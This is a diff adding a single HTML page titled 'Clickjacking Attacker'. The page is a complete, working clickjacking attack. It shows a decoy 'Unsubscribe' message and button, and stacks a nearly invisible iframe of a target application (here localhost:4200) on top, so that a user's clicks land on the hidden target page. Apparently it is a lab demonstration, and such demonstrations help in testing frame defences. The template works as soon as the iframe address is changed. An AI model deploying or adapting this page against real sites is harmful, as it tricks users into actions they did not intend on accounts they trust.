@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Clickjacking Attacker</title>
+  </head>
+  <style>
+    #websites {
+      position: relative;
+    }
+
+    #decoyWebsite,
+    #targetWebsite {
+      width: 1280px;
+      height: 720px;
+    }
+
+    #decoyWebsite {
+      position: absolute;
+      z-index: 1;
+      top: 135px;
+      left: 85px;
+    }
+
+    #decoyWebsite button {
+      background: #000;
+      color: #fff;
+      border-radius: 5px;
+      padding: 4px 8px;
+      border: none;
+    }
+
+    #targetWebsite {
+      position: relative;
+      opacity: 0.00001;
+      z-index: 2;
+    }
+  </style>
+  <body>
+    <div id="websites">
+      <div id="decoyWebsite">
+        <h1>
+          If you want to unsubscribe from our mail list, click on unsubscribe
+          button.
+        </h1>
+        <button>Unsubscribe</button>
+      </div>
+      <iframe id="targetWebsite" src="http://localhost:4200"></iframe>
+    </div>
+  </body>
+</html>
